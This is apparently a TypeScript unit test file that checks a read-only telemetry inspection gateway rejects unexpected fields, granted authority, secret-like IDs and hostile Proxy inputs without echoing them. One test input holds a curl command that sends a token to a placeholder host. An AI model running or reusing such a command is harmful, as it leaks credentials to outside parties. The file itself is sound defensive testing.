import {
  evaluatePerformanceTelemetrySnapshot,
  performanceTelemetrySnapshotContract,
  type PerformanceTelemetryMetric,
  type PerformanceTelemetrySignal,
  type PerformanceTelemetrySnapshotRequest,
} from "@lnsat/packets";
import { describe, expect, it } from "vitest";
import {
  inspectPerformanceTelemetryGatewayRequest,
  performanceTelemetryInspectionGatewayContract,
} from "../src/index.js";

const now = new Date("2026-07-11T12:01:00.000Z");

describe("@lnsat/api BP-0853 performance telemetry Gateway inspection", () => {
  it("publishes immutable caller-supplied read-only metadata", () => {
    expect(performanceTelemetryInspectionGatewayContract).toMatchObject({
      contract_id: "lnsat.gateway.performance_telemetry.inspect.v0_1",
      method: "POST",
      path: "/v1/performance/telemetry/inspect",
      caller_supplied_only: true,
      read_only: true,
      recommendation_only: true,
      collector_allowed: false,
      node_agent_allowed: false,
      hardware_probe_allowed: false,
      benchmark_execution_allowed: false,
      placement_allowed: false,
      alert_dispatch_allowed: false,
      runtime_allowed: false,
      database_write_allowed: false,
      network_access_allowed: false,
      side_effects: [],
    });
    expect(Object.isFrozen(performanceTelemetryInspectionGatewayContract)).toBe(true);
    expect(
      Object.isFrozen(performanceTelemetryInspectionGatewayContract.source_docs),
    ).toBe(true);
  });

  it("delegates healthy telemetry exactly to BP-0852", async () => {
    const telemetryRequest = validTelemetryRequest();
    const delegated = evaluatePerformanceTelemetrySnapshot(telemetryRequest);
    expect(delegated.ok).toBe(true);

    const response = await inspectPerformanceTelemetryGatewayRequest(
      {
        request_id: "req_bp0853_healthy",
        telemetry_request: telemetryRequest,
        collector_allowed: false,
        node_agent_allowed: false,
        hardware_probe_allowed: false,
        benchmark_execution_allowed: false,
        placement_allowed: false,
        alert_dispatch_allowed: false,
        runtime_allowed: false,
        database_write_allowed: false,
        network_access_allowed: false,
        side_effects: [],
      },
      { now },
    );

    expect(response).toMatchObject({
      ok: true,
      contract_id: "lnsat.gateway.performance_telemetry.inspect.v0_1",
      request_id: "req_bp0853_healthy",
      inspected_at: "2026-07-11T12:01:00.000Z",
      telemetry_source: "caller_supplied",
      freshness: "current",
      health_status: "healthy",
      evidence_status: "complete",
      performance_status: "healthy",
      constraints: closedConstraints(),
      side_effects: [],
    });
    if (!response.ok || !delegated.ok) throw new Error("expected healthy evidence");
    expect(response.performance_telemetry_snapshot).toEqual(
      delegated.performance_telemetry_snapshot,
    );
    expect(response.findings).toEqual(
      delegated.performance_telemetry_snapshot.findings,
    );
    expect(response.coverage).toEqual(
      delegated.performance_telemetry_snapshot.coverage,
    );
    expect(response.summary).toEqual(delegated.performance_telemetry_snapshot.summary);
  });

  it.each([
    [
      "critical",
      (request: PerformanceTelemetrySnapshotRequest) => {
        request.snapshot.signals[0]!.value = 99;
      },
    ],
    [
      "stale",
      (request: PerformanceTelemetrySnapshotRequest) => {
        request.evaluated_at = "2026-07-11T00:12:00.000Z";
      },
    ],
    [
      "insufficient_evidence",
      (request: PerformanceTelemetrySnapshotRequest) => {
        request.snapshot.signals = request.snapshot.signals.filter(
          (entry) => entry.domain !== "network",
        );
      },
    ],
  ])("keeps valid %s evidence successful", async (status, mutate) => {
    const request = validTelemetryRequest();
    mutate(request);
    const response = await inspectPerformanceTelemetryGatewayRequest(
      { telemetry_request: request },
      { now },
    );
    expect(response).toMatchObject({
      ok: true,
      performance_status: status,
      constraints: closedConstraints(),
      side_effects: [],
    });
  });

  it("separates delegated errors and withholds rejected telemetry", async () => {
    const response = await inspectPerformanceTelemetryGatewayRequest(
      {
        request_id: "req_bp0853_invalid_telemetry",
        telemetry_request: {
          ...validTelemetryRequest(),
          command: "curl https://example.invalid/?token:private-value",
          collector_allowed: true,
        },
      },
      { now },
    );

    expect(response).toMatchObject({
      ok: false,
      request_id: "req_bp0853_invalid_telemetry",
      request_errors: [],
      telemetry_errors: expect.arrayContaining([
        expect.objectContaining({
          code: "performance_telemetry.unexpected_field",
          path: "/*",
        }),
        expect.objectContaining({
          code: "performance_telemetry.collector_forbidden",
        }),
      ]),
      performance_telemetry_snapshot: null,
      raw_input_content: "withheld",
      constraints: closedConstraints(),
      side_effects: [],
    });
    expect(JSON.stringify(response)).not.toContain("private-value");
    expect(JSON.stringify(response)).not.toContain("curl");
  });

  it("rejects every outer authority and side effects", async () => {
    const response = await inspectPerformanceTelemetryGatewayRequest(
      {
        telemetry_request: validTelemetryRequest(),
        collector_allowed: true,
        node_agent_allowed: true,
        hardware_probe_allowed: true,
        benchmark_execution_allowed: true,
        placement_allowed: true,
        alert_dispatch_allowed: true,
        runtime_allowed: true,
        database_write_allowed: true,
        network_access_allowed: true,
        side_effects: ["dispatch"],
      },
      { now },
    );
    expect(response.ok).toBe(false);
    if (response.ok) throw new Error("expected closed authority rejection");
    expect(response.request_errors.map((error) => error.code)).toEqual([
      "performance_telemetry_gateway.collector_forbidden",
      "performance_telemetry_gateway.node_agent_forbidden",
      "performance_telemetry_gateway.hardware_probe_forbidden",
      "performance_telemetry_gateway.benchmark_execution_forbidden",
      "performance_telemetry_gateway.placement_forbidden",
      "performance_telemetry_gateway.alert_dispatch_forbidden",
      "performance_telemetry_gateway.runtime_forbidden",
      "performance_telemetry_gateway.database_write_forbidden",
      "performance_telemetry_gateway.network_access_forbidden",
      "performance_telemetry_gateway.side_effects_forbidden",
    ]);
    expect(response.telemetry_errors).toEqual([]);
  });

  it("rejects malformed and unexpected outer fields without raw key echo", async () => {
    const marker = "private_outer_marker";
    const response = await inspectPerformanceTelemetryGatewayRequest(
      {
        request_id: 853,
        telemetry_request: validTelemetryRequest(),
        [marker]: false,
      },
      { now },
    );
    expect(response.ok).toBe(false);
    if (response.ok) throw new Error("expected malformed rejection");
    expect(response.request_errors).toEqual([
      expect.objectContaining({
        code: "performance_telemetry_gateway.unexpected_field",
        path: "/*",
      }),
      expect.objectContaining({
        code: "performance_telemetry_gateway.invalid_request_id",
      }),
    ]);
    expect(JSON.stringify(response)).not.toContain(marker);
  });

  it("rejects secret-like request ids without echo", async () => {
    const response = await inspectPerformanceTelemetryGatewayRequest(
      {
        request_id: "token:private-request-marker",
        telemetry_request: validTelemetryRequest(),
      },
      { now },
    );
    expect(response).toMatchObject({
      ok: false,
      request_id: null,
      request_errors: [
        expect.objectContaining({
          code: "performance_telemetry_gateway.invalid_request_id",
        }),
      ],
    });
    expect(JSON.stringify(response)).not.toContain("private-request-marker");
  });

  it("rejects accessors and non-enumerable fields without invoking getters", async () => {
    let reads = 0;
    const accessor = {
      telemetry_request: validTelemetryRequest(),
      get request_id() {
        reads += 1;
        return "req_accessor";
      },
    };
    const hidden = { telemetry_request: validTelemetryRequest() };
    Object.defineProperty(hidden, "request_id", {
      enumerable: false,
      value: "req_hidden",
    });

    expect(
      (await inspectPerformanceTelemetryGatewayRequest(accessor, { now })).ok,
    ).toBe(false);
    expect((await inspectPerformanceTelemetryGatewayRequest(hidden, { now })).ok).toBe(
      false,
    );
    expect(reads).toBe(0);
  });

  it("contains hostile proxies and invalid clocks", async () => {
    const marker = "hostile_gateway_marker";
    const hostile = new Proxy(
      { telemetry_request: validTelemetryRequest() },
      {
        ownKeys() {
          throw new Error(marker);
        },
      },
    );
    const hostileResult = await inspectPerformanceTelemetryGatewayRequest(hostile, {
      now,
    });
    const clockResult = await inspectPerformanceTelemetryGatewayRequest(
      { telemetry_request: validTelemetryRequest() },
      { now: new Date(Number.NaN) },
    );

    expect(hostileResult).toMatchObject({
      ok: false,
      request_errors: [
        expect.objectContaining({
          code: "performance_telemetry_gateway.invalid_request",
        }),
      ],
      raw_input_content: "withheld",
    });
    expect(JSON.stringify(hostileResult)).not.toContain(marker);
    expect(clockResult).toMatchObject({
      ok: false,
      inspected_at: null,
      request_errors: [
        expect.objectContaining({
          code: "performance_telemetry_gateway.invalid_inspection_time",
        }),
      ],
    });
  });

  it("rejects proxied side-effect arrays without executing content", async () => {
    const marker = "side-effect-length-marker";
    const sideEffects = new Proxy([], {
      get(target, property, receiver) {
        if (property === "length") throw new Error(marker);
        return Reflect.get(target, property, receiver);
      },
    });
    const response = await inspectPerformanceTelemetryGatewayRequest(
      { telemetry_request: validTelemetryRequest(), side_effects: sideEffects },
      { now },
    );
    expect(response.ok).toBe(false);
    if (response.ok) throw new Error("expected side-effect proxy rejection");
    expect(response.request_errors).toContainEqual(
      expect.objectContaining({
        code: "performance_telemetry_gateway.side_effects_forbidden",
      }),
    );
    expect(JSON.stringify(response)).not.toContain(marker);
  });
});

function validTelemetryRequest(): PerformanceTelemetrySnapshotRequest {
  return {
    snapshot: {
      snapshot_id: "snapshot:lab-r730-01:0853",
      node_id: "node:lab-dell-r730-01",
      window_started_at: "2026-07-11T00:00:00.000Z",
      window_ended_at: "2026-07-11T00:10:00.000Z",
      signals: [
        signal("cpu", "cpu_utilization_pct", 50, "gauge"),
        signal("memory", "memory_utilization_pct", 60, "gauge"),
        signal("storage", "storage_utilization_pct", 50, "gauge"),
        signal("network", "network_utilization_pct", 30, "gauge"),
        signal("thermal", "thermal_celsius", 60, "gauge"),
        signal("workload", "workload_availability_pct", 99.99, "gauge"),
      ],
    },
    evaluated_at: "2026-07-11T00:10:30.000Z",
    max_age_ms: 60_000,
    collector_allowed: false,
    node_agent_allowed: false,
    hardware_probe_allowed: false,
    benchmark_execution_allowed: false,
    placement_allowed: false,
    alert_dispatch_allowed: false,
    runtime_allowed: false,
    database_write_allowed: false,
    network_access_allowed: false,
    side_effects: [],
  };
}

function signal(
  id: string,
  metricName: PerformanceTelemetryMetric,
  value: number,
  aggregation: PerformanceTelemetrySignal["aggregation"],
): PerformanceTelemetrySignal {
  const definition = performanceTelemetrySnapshotContract.metrics[metricName];
  return {
    signal_ref: `signal:${id}`,
    domain: definition.domain,
    metric: metricName,
    scope_ref: id === "workload" ? "service:gateway" : "node:lab-dell-r730-01",
    unit: definition.unit,
    aggregation,
    value,
    quality: "observed",
  };
}

function closedConstraints() {
  return {
    supplied_telemetry_only: true,
    read_only: true,
    recommendation_only: true,
    collector_allowed: false,
    node_agent_allowed: false,
    hardware_probe_allowed: false,
    benchmark_execution_allowed: false,
    placement_allowed: false,
    alert_dispatch_allowed: false,
    runtime_allowed: false,
    database_write_allowed: false,
    network_access_allowed: false,
  };
}
